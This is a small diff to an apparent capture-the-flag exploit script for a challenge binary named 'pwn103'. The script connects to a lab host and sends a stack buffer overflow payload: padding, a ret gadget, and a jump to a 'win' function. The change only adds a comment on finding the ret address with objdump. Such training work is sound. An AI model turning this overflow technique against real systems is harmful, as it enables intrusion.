@@ -9,7 +9,7 @@ p = remote(current_thmip, 9003)
 # p = process('./pwn103.pwn103')
 
 payload = b'A'*40
-payload += p64(0x401016) # address of a 'ret' instruction - needed for stack alignment
+payload += p64(0x401016) # address of a 'ret' instruction - needed for stack alignment. found via `objdump -d pwn103.pwn103 | grep ret`
 payload += p64(0x401554) # fixed location of admins_only win function
 
 p.clean()
